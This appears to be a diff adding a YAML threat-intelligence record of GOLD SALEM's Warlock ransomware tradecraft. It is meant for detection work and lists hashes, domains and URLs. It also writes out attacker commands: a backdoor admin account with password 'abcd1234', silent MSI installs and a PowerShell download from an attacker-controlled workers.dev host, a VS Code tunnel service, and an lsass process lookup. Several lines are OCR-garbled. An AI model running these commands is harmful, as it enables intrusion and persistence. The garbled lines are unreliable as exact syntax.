@@ -1,0 +1,131 @@
+description: Threat involves ransomware attacks using various tools and techniques
+  including Velociraptor, VS Code, Cloudflared tunneling tool, and others.
+attribution: GOLD SALEM
+malware_families:
+- Warlock
+- LockBit
+- Babuk
+- LockBit 3.0
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - w3wp.exe
+  - msiexec.exe
+  - code.exe
+  - cf.msi
+  - vmtools.exe
+  - rsndispot.sys
+  - kl.sys
+  - ServiceMouse.sys
+  - VMTools-Eng.exe
+  - wininit.exe
+  - services.exe
+  commandline:
+  - c:\\windows\\system32\\cmd.exe /c net user backupadmin abcd1234
+  - '%sysdir%\\net1 localgroup administrators lapsadmin1 /add'
+  - tasklist /v /fo csv | findstr /i "lsass.exe"
+  - c:\\windows\\system32\\cmd.exe /c net user backupadmin abcd1234%sysdir%\\net1
+    localgroup administrators lapsadmin1 /addtasklist /v /fo csv | findstr /i "lsass.exe"
+  - msiexec /q /ihttps://files.qaubctgg.workers.dev/v2.msi
+  - cmd.exe /\"C:\\ProgramData\\code.exe tunnel -accept-server-license-terms serviceinstall > c:\\users\\public\\i.log\"
+  - cmd.exe /c \"msiexec /q /ihttps://files.qaubctgg.workers.dev/sc.msi\"
+  - cmd.exe / typecr\\users\\public\\i. log\"
+  - cmd.exe /c \"typeci\\users\\public\\i. log\"
+  powershell:
+  - powershe1l.exe -ExecutionPolicy Unrestricted -encodedCommand Invoke-WebRequestUri
+    https://files.qaubctgg.workers.dev/code.exe\" -QutFile\"C:\\ProgramData\\code.exe\"
+  scripting_engine:
+  - Batch scripts
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Radmin
+  image_load:
+  - Comsvcs.dll
+  - rsndispot.sys
+  - kl.sys
+  - ServiceMouse.sys
+  network_connections:
+  - w3wp.exe, qaubctgg.workers.dev, 80
+  - msiexec.exe, qaubctgg.workers.dev, 443
+  - code.exe, qaubctgg.workers.dev, 443
+  - cf.msi, qaubctgg.workers.dev, 443
+  file_activity:
+  - c:\\windows\\system32\\cmd.exe
+  - net user backupadmin abcd1234
+  - tasklist /v /fo csv
+  - velo.qaubctgg.workers.dev
+  - cf.msi
+  - code.exe
+  - radmin-en.msi
+  - ssh.msi
+  - https://files.qaubctgg.workers.dev/v2.msi
+  - https://files.qaubctgg.workers.dev/sc.msi
+  - C:\\ProgramData\\code.exe
+  persistence:
+  - Creating new administrator accounts with password "abcd1234"
+  - Using vmtools.exe to kill EDR processes
+  - Importing and using rsndispot.sys and kl.sys drivers
+  process_relations:
+  - w3wp.exe->msiexec.exe->Velociraptor installer
+  - w3wp.exe -ap \"SharePoint - \" -v v4.0-1 webengined4.dll -a \\\\.\\pipe\\iisipme2538f90-fd4b-4eel-8efc-e5e31e09d88b
+    -hC:\\inetpub\\temp\\apppools\\SharePoint - \\SharePoint -|  lconfig\"
+  - wininit.exe wininit.exe
+  - services.exeC:\\Windows\\system32\\services.exe
+  - Velociraptor.execanfig \"C:\\Program Files\\Velociraptor\\/client.config.yaml*
+    service run
+IOCs:
+  hashes:
+  - 6147d367ae66158ec3ef5b251c2995c4
+  - 0c319f0783d7e858af555c22ed00b0bd41867365
+  - 00714292822d568018bb92270daecdf243a2ca232189677d27e38d632bfd68be
+  - 054a32d6033b1744dca7f49b2e466ea2
+  - c85c9a09cd1cb1691da0d96772391be6ddba3555
+  - ea8c8f834523886b07d87e85e24f124391d69a738814a0f7c31132b6b712ed65
+  - a4a8bfaccbdbaee28836d2a62170534b
+  - 3a8ad0eb1d4395867d0f38d159f707e16bec955c
+  - 2695e26637dbf8c2aa46af702c891a5a154e9a145948ce504db0ea6a2d50e734
+  - 4ba756bff1a78f17ad477d818fe7e283
+  - 0d385213a4bb59e6e1b36667b48d924f33d24e90
+  - 5a56319605f60380b52aecba1f1ee6026c807d55026b806a3b6585d5ba5931bd
+  - 257c07ccd3c931774d4f4e106ffb79eb
+  - 34e8ff4eb61529eab8b42efd94ba57461d94d066
+  - ea4a453be116071ab1ccbd24eb8755bf0579649f41a7b94ab9e68571bb9f4a1e
+  - d67d2f6b121b9807e640d90e1048d0d7
+  - 9ddeba07db1120c161d85b7a5a4235b328720838
+  - c8a8c7e21136a099665c2fad9accb41152d129466b719ea71678bab665e03389
+  - a59832798a697bfe456b14f10e6eccd4
+  - c81efc67a52ddd207528ab4ce74c5d25b446b25e
+  - 85844ae7394f2cf907b6378b415e77f7e29069c7e791598cf0985adf4f53320e
+  - 6ff0661c529bea995a796951fb87632c
+  - dbea714c220b27b90967fce0f8ed7a500c95c208
+  - a3b061300d6aee6f8c6e08c68b80a18a8d4500b66d0d179b962fd96f41dc2889
+  - 99188828b1b7770fdf55cf25442d4c03
+  - 098306e1a34022e0c3654c2839757c3f1abbe184
+  - c70fafe5f9a3e5a9ee7de584dd024cb552443659f06348398d3873aa88fd6682
+  - 67687b54f9cfee0b551c6847be7ed625e170d8bb882f888e3d0b22312db146cd
+  - 78cd87dfa9ba0f9b533310ca98b54489
+  - 7cbe4243c09f299b2dbfdc10f63846541367dcef
+  - 34b2a6c334813adb2cc70f5bd666c4afbdc4a6d8a58cc1c7a902b13bbd2381f4
+  - 61555d9b134ae5c390ccccf4706fef2128bba33f
+  - 649bdaa38e60ede6d140bd54ca5412f1091186a803d3905465219053393f6421
+  - 297fd6cc2a747b180416960ee80e4f8
+  - ffbac5ff55d0ba6ba7f18fbab6955281e147c96c
+  - 66a01192355a1ee15a0ceafacbf3bf83148813f67ba24bdfc5423e4fcb4e744f
+  - 6795c530e941ee7e4b0ee0458362c95d
+  - a2b70ca589a584e5ac214283935a6c3af890aa3a
+  ip_addresses: []
+  domains:
+  - qaubctgg.workers.dev
+  - qgtxtebl.workers.dev
+  - stoaccinfoniqaveeambkp.blob.core.windows.net
+  urls:
+  - hxxps://stoaccinfoniqaveeambkp.blob.core.windows.net/veeam/v2.msi
+  - https://files.qaubctgg.workers.dev/v2.msi
+  - https://files.qaubctgg.workers.dev/sc.msi
+  - https://files.qaubctgg.workers.dev/code.exe
+  - https://stoaccinfoniqaveeambkp.blob.core.windows.net/veeam
+authors:
+- Counter Threat UnitTM (CTU) researchers
+reference: https://news.sophos.com/en-us/2025/12/11/gold-salem-tradecraft-for-deploying-warlock-ransomware/
+date_of_publication: December 11, 2025
+file_creation_date: December 11, 2025
